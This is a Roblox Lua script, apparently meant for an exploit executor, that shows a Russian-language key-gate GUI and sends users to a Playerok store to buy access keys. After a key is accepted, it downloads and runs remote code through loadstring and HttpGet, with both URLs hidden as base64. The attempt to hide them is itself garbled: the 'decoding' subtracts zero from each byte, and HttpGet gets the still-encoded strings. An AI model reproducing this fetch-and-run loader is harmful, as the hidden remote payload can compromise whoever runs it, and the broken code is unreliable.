local TS=game:GetService("TweenService")
local RS=game:GetService("RunService")
local CG=game:GetService("CoreGui")
local HS=game:GetService("HttpService")

local old=CG:FindFirstChild("PlayerokKeyGui")
if old then old:Destroy() end

local keyURL=HS:JSONDecode(game:HttpGet(
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JvYmxveHNjcmlwdGtleS9NaWxlZGlLZXlzLS9tYWluL01JTEVESS1rZXlzLmpzb24="
):gsub(".", function(c)
    return string.char(c:byte() - 0)
end))

local today=os.date("%Y-%m-%d")
local tKey=keyURL[today]
local vKey=nil
if tKey then
    vKey=""
    for _,v in ipairs(tKey) do
        vKey=vKey..string.char(v)
    end
end

local gui=Instance.new("ScreenGui")
gui.Name="PlayerokKeyGui"
gui.ResetOnSpawn=false
gui.Parent=CG

local f=Instance.new("Frame",gui)
f.Size=UDim2.new(0,0,0,0)
f.Position=UDim2.new(0.5,0,0.4,0)
f.AnchorPoint=Vector2.new(0.5,0.5)
f.BackgroundColor3=Color3.fromRGB(120,140,255)
Instance.new("UICorner",f).CornerRadius=UDim.new(0,20)

local grad=Instance.new("UIGradient",f)
grad.Color=ColorSequence.new{ColorSequenceKeypoint.new(0,Color3.fromRGB(120,140,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(200,220,255))}
grad.Rotation=45

local t=Instance.new("TextLabel",f)
t.Size=UDim2.new(1,-20,0,40)
t.Position=UDim2.new(0,10,0,60)
t.BackgroundTransparency=1
t.Text="🔐 Введите ключ от Playerok"
t.TextColor3=Color3.new(1,1,1)
t.Font=Enum.Font.GothamBold
t.TextSize=22

local b=Instance.new("TextBox",f)
b.Size=UDim2.new(0.8,0,0,36)
b.Position=UDim2.new(0.1,0,0,110)
b.PlaceholderText="Вставьте ключ..."
b.Font=Enum.Font.Gotham
b.TextSize=20
b.TextColor3=Color3.fromRGB(50,50,50)
b.BackgroundColor3=Color3.fromRGB(230,230,255)
Instance.new("UICorner",b).CornerRadius=UDim.new(0,12)

local btn=Instance.new("TextButton",f)
btn.Size=UDim2.new(0.8,0,0,40)
btn.Position=UDim2.new(0.1,0,0,160)
btn.BackgroundColor3=Color3.fromRGB(160,200,255)
btn.Font=Enum.Font.GothamBold
btn.TextSize=20
btn.TextColor3=Color3.fromRGB(30,30,30)
btn.Text="Проверить"
Instance.new("UICorner",btn).CornerRadius=UDim.new(0,12)

local gBtn=Instance.new("TextButton",f)
gBtn.Size=UDim2.new(0.8,0,0,40)
gBtn.Position=UDim2.new(0.1,0,0,210)
gBtn.BackgroundColor3=Color3.fromRGB(100,200,255)
gBtn.Font=Enum.Font.GothamBold
gBtn.TextSize=20
gBtn.TextColor3=Color3.fromRGB(30,30,30)
gBtn.Text="Получить ключ"
Instance.new("UICorner",gBtn).CornerRadius=UDim.new(0,12)

local fb=Instance.new("TextLabel",f)
fb.Size=UDim2.new(1,0,0,20)
fb.Position=UDim2.new(0,0,0,145)
fb.BackgroundTransparency=1
fb.Text=""
fb.TextColor3=Color3.new(1,1,1)
fb.Font=Enum.Font.Gotham
fb.TextSize=18

local pbG=Instance.new("Frame",f)
pbG.Size=UDim2.new(0.8,0,0,20)
pbG.Position=UDim2.new(0.1,0,0,260)
pbG.BackgroundColor3=Color3.fromRGB(200,200,255)
Instance.new("UICorner",pbG).CornerRadius=UDim.new(0,10)

local pb=Instance.new("Frame",pbG)
pb.Size=UDim2.new(0,0,1,0)
pb.BackgroundColor3=Color3.fromRGB(30,200,30)
Instance.new("UICorner",pb).CornerRadius=UDim.new(0,10)

TS:Create(f,TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=UDim2.new(0,400,0,320)}):Play()
local function pulse(p) TS:Create(p,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{Size=UDim2.new(0.82,0,0,42)}):Play() end
pulse(btn) pulse(gBtn)

local function runScript()
    local dur=2
    local s=tick()
    local conn
    conn=RS.RenderStepped:Connect(function()
        local el=tick()-s
        local pct=math.clamp(el/dur,0,1)
        pb.Size=UDim2.new(pct,0,1,0)
        if pct>=1 then
            conn:Disconnect()
            gui:Destroy()
            loadstring(game:HttpGet("aHR0cHM6Ly9naXN0LmNoL2Jpc3QvY29kZS5sb2Fk"))()
        end
    end)
end

btn.MouseButton1Click:Connect(function()
    local input=b.Text:match("^%s*(.-)%s*$")
    if not vKey then
        fb.Text="⚠️ Ключ на сегодня не найден"
        fb.TextColor3=Color3.fromRGB(255,170,0)
    elseif input==vKey then
        fb.Text="✅ Ключ верный, загружаем..."
        fb.TextColor3=Color3.fromRGB(30,200,30)
        runScript()
    else
        fb.Text="❌ Неверный ключ"
        fb.TextColor3=Color3.fromRGB(200,40,40)
    end
end)

gBtn.MouseButton1Click:Connect(function()
    setclipboard("https://playerok.com/profile/MILEDI-STORE/products")
    fb.Text="🔗 Ссылка скопирована! Откройте её в Chrome."
    fb.TextColor3=Color3.fromRGB(30,200,30)
end)
